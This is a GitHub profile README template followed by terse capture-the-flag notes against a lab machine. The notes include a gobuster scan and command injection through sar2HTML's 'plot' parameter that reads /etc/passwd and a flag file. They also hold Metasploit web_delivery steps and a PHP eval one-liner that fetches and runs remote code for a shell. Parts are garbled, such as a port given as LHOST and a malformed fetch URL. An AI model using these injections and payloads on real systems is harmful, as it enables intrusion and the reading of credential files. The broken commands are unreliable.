- 👋 Hi, I’m @Sharvinleon
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
Sharvinleon/Sharvinleon is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->https://drive.google.com/file/d/1Ds6vnRHAIvX3xSbM9M_1v1jjWekJgnRK/view?usp=drivesdk
https://drive.google.com/file/d/1pfe99sbOOA7NtDNe-s1VieMdNp9yFdLD/view?usp=drivesdk
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt-u http://(ip)
192.168.79.131/sar2HTML/index.php?plot=; cat /etc/passwd
192.168.79.131/sar2HTML/index.php?plot=; cat /home/love/Desktop/user.txt
https://russellmurad.medium.com/hacking-messaih-1-vulnhub-walkthrough-601147727dcc
https://resources.infosecinstitute.com/topics/capture-the-flag/victim-1-vulnhub-ctf-walkthrough/
https://drive.google.com/file/d/1Ds6vnRHAIvX3xSbM9M_1v1jjWekJgnRK/view?usp=drivesdk
Msfconsole
Use exploit/multi/script/web_delivery
Show targets
Set target 1
Set LHOST 192.168.79.131
Set LHOST 4444
192.168.79.131/sar2HTML/index.php?plot=;php -d allow_url_fopen=true -r "eval(file_get_contents('http://4444:8080/tknKjmIBixEa', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"